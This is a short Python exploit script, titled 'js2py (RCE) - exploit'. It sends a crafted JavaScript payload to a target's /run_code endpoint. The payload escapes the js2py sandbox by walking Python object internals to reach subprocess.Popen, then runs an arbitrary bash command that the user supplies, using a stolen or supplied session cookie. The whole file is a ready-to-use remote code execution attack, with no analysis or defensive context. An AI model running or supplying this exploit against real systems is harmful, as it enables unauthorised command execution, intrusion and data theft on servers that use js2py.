#!/usr/bin/python3
from argparse import ArgumentParser

if __name__ == "__main__":
    parser = ArgumentParser(prog="js2py (RCE) - exploit")
    parser.add_argument("-t", "--target", help="Target ipaddress:port", type=str, required=True)
    parser.add_argument("-c", "--command", help="Remote command to execute", type=str, required=True)
    parser.add_argument("-s", "--session", help="Session", type=str)

args = parser.parse_args()

target = args.target
cmd = args.command
session = args.session

import requests

payload = f'''
function exploit(cmd) {{
    let a = Object.getOwnPropertyNames({{}}).__class__.__base__.__getattribute__
    const obj = a(a(a,"__class__"), "__base__").__subclasses__()
    for (let i = 0; i < obj.length; i++) {{
        if (obj[i].__module__ == "subprocess" && obj[i].__name__ == "Popen") {{
            let Popen = obj[i]
            let p = Popen(cmd)
            let res = p.communicate()
            return p.pid
        }}
    }}
    return -1
}}

const cmd = ["/bin/bash","-c","{cmd}"]
exploit(cmd)
'''

json = { "code": payload }
cookies = {"session": session }
url = f"http://{target}/run_code"

response = requests.post(url, cookies=cookies, json=json)

print("\n========== js2py RCE =========\n")
print("Response: " + response.text)
print("\n==============================\n")
